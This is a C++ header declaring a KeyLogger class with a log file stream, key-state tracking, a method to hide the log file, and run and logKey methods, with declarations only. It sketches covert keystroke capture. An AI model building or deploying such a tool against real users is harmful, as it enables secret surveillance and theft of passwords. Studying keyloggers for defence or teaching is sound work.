#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <string>
#include <fstream>
#include <unordered_map>
#include <chrono>

class KeyLogger
{
private:
    std::string logFile; // Path to the logging
    std::ofstream loggingFile; // Stream for writing the logs to the file
    std::unordered_map<int, bool> keyState; // Tracks if key is pressed
    std::unordered_map<int, std::chrono::steady_clock::time_point> lastKeyPress; // Tracks time of last key press 

    void makeFileHidden(); // Create a hidden file where we will store logs
    void logKey(int key); // Log a key press to the file
public:
    KeyLogger(const std::string& filePath); // Consturctor
    ~KeyLogger(); // Destructor


    void run(); // Start the keylogger
};

#endif // KEYLOGGER_HPP